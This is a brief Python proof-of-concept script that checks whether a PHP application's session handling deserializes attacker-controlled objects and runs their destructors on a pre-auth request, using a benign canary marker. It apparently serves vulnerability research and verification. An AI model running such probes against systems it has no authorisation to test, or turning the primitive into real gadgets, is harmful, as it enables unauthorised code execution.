#!/usr/bin/env python3
# Primitive 2: a serialized object in session data is deserialized on
# session_start() and its __destruct() runs at shutdown -- no unserialize() in
# the app. Benign canary gadget; two requests (trigger, then read the marker).
import argparse
import json
import sys
import urllib.request


def get(url, sid):
    req = urllib.request.Request(url.rstrip("/") + "/session_probe.php?action=show",
                                 headers={"Cookie": f"PHPSESSID={sid}"})
    with urllib.request.urlopen(req, timeout=10) as r:
        return json.load(r)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--url", required=True)
    ap.add_argument("--sid", default="canarydemo")
    args = ap.parse_args()

    data = get(args.url, args.sid)
    print("  session contents:", json.dumps(data["contents"]))
    data = get(args.url, args.sid)
    fired = "DestructProbe::__destruct fired" in (data.get("marker_log") or "")
    print("  marker log:", (data.get("marker_log") or "").strip() or "(empty)")
    print()
    if fired:
        print("  RESULT: attacker-controlled __destruct() EXECUTED from session "
              "bytes on a pre-auth request.")
        return 0
    print("  RESULT: destructor did not fire (target patched / not seeded).")
    return 1


if __name__ == "__main__":
    sys.exit(main())
